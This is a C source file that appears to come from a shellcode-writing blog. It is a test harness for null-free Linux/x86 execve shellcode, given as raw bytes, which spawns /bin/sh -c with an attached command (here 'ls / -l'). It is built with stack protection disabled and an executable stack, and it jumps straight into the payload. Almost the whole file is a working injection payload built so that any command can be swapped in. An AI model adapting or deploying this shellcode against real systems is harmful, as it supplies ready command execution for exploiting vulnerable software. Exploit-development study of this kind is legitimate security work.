/*

execve Dynamic Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   x86_execve_dyn_shellcode

   * 47 bytes (without dynamic command)
   * null-free


   # gcc -m32 -fno-stack-protector -z execstack \
   x86_execve_dyn_shellcode.c -o \
   x86_execve_dyn_shellcode

   Testing
   # ./x86_execve_dyn_shellcode

*/

#include <stdio.h>
#include <string.h>

int main(void)
{
	unsigned char code[] = "\x31\xdb\xf7\xe3\xb0\x0b\x52\x66\x68\x2d"
			       "\x63\x89\xe7\xeb\x1b\x5e\xb3\x07\x88\x14"
			       "\x1e\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
			       "\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1"
			       "\xcd\x80\xe8\xe0\xff\xff\xff"
			       "\x6c\x73\x20\x2f\x20\x2d\x6c"; // ls / -l

	// When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any
	// circumstance.

	__asm__("lea %[code], %%ebp\n\t"
		"mov $0xffffffff, %%eax\n\t"
		"mov %%eax, %%ebx\n\t"
		"mov %%eax, %%ecx\n\t"
		"mov %%eax, %%edx\n\t"
		"mov %%eax, %%esi\n\t"
		"mov %%eax, %%edi\n\t"
		"call *%%ebp\n\t"
		: /* no outputs */
		: [code] "m"(code));
}
